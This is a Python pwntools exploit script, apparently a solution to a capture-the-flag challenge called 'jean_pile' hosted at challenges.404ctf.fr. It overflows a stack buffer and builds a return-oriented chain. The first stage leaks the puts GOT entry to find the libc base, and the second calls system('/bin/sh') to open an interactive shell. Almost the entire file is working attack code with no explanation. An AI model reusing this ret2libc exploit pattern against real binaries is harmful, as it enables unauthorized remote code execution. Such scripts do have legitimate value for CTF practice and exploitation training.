from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep

context.arch = "amd64"
context.word_size = 64

file = "./jean_pile"
args = []
io: process = None

speed = 0.1

def debug():
    gdb.attach(io, gdbscript=
    """

    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote(host="challenges.404ctf.fr", port=31957)

def launch_local():
    global file, io
    io = process([file, *args])
    # debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)

def launch():
    l = launch_local
    # l = launch_remote
    l()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1: a_ = 0
    b_ = d.find(b, a_)
    if b_ == -1: b_ = 0
    return d[a_+len(a):b_]

#
# exploit goes here
#

exe = ELF(file)
libc = ELF("./libc.so.6")

def exploit():
    pop_rdi = 0x400b83
    pop_rsi_r15 = 0x400b81

    sla(b">>> ", b"1")
    payload = b"A" * 0x30 + b"B" * 8
    payload += flat([
        pop_rdi,
        0x602018, # got entry of puts
        exe.plt["puts"],
        exe.sym["service"],
    ])
    sla(b">> ", payload)

    leak = recvu(b"plat")
    leak = getb(leak, b"", b"\nVoulez-vous")
    libc.address = u64(leak) - libc.sym["puts"] 
    info("libc: %#018x" % libc.address)


    sla(b">>> ", b"1")
    payload = b"A" * 0x30 + b"B" * 8
    payload += flat([
        pop_rsi_r15,
        0,
        0,
        pop_rdi,
        next(libc.search(b"/bin/sh")),
        libc.sym["system"],
    ])
    print(payload)
    sla(b">> ", payload)

    io.interactive()
    input("end")
    exit()

launch()
exploit()
